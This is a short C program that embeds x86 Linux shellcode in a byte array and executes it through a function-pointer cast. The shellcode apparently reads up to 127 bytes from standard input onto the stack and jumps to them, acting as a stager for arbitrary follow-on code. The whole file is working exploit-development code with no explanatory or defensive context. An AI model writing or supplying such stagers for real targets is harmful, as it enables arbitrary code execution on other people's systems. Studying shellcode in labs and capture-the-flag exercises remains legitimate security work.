#include <stdio.h>
#include <stdlib.h>

char shellcode[] = "\x6a\x7f\x5a\x54\x59\x31\xdb\x6a\x03\x58\xcd\x80\x51\xc3"; 

int main(int argc, char *argv[]){
	(* (int (*)())shellcode)();
}

